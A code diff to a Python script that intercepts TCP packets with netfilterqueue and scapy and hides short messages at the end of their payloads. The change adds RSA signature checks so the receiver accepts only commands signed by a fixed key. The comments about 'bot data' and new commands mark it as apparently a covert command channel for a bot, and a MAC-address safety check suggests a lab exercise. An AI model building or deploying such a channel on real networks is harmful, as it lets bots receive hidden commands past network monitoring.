@@ -1,10 +1,15 @@
 import uuid
 
+import rsa
 from netfilterqueue import NetfilterQueue
 from scapy.all import *
 
 MAGIC = 0x42 # a magic identifying number
-MSG_LEN = 16 # bytes to append/get from the end of a packet
+
+MSG_LEN = 16 # length of message
+DATA_LEN = MSG_LEN + 64 # + length of signature
+
+PUBKEY = rsa.PublicKey(10888551840171190772581446131615487397004739141476239826081159125184318457653121098130618388522625264228398784712748098397877149360163979789180129228494641, 65537)
 
 def safety_check():
     # A list of MAC addresses on which this is allowed to run
@@ -20,15 +25,33 @@ def safety_check():
         exit(1)
 
 def add_message(pkt, message):
-    pkt = pkt/Raw(load=message.rjust(MSG_LEN, '\0'))
-    pkt.len += MSG_LEN
+    pkt = pkt/Raw(load=message)
+    pkt.len += DATA_LEN
     return pkt
 
 def get_message(pkt):
-    msg = bytes(pkt[TCP].payload)[-MSG_LEN:]
-    pkt[TCP].payload = Raw(bytes(pkt[TCP].payload)[:-MSG_LEN])
-    pkt.len -= MSG_LEN
-    return msg
+    data = bytes(pkt[TCP].payload)[-DATA_LEN:]
+
+    # remove bot data
+    pkt[TCP].payload = Raw(bytes(pkt[TCP].payload)[:-DATA_LEN])
+    pkt.len -= DATA_LEN
+
+    # verify signature
+    if verify_message(data):
+        print('got a new command!', data[1:MSG_LEN].decode('ascii'))
+        return data
+    else:
+        print('verification failed!')
+        return False
+
+def verify_message(data):
+    msg = data[:MSG_LEN]
+    sig = data[MSG_LEN:]
+    try:
+        return rsa.verify(msg, sig, PUBKEY)
+    except:
+        return False
+    return False
 
 def set_and_accept(packet_in, pkt):
     # force a checksum recalc
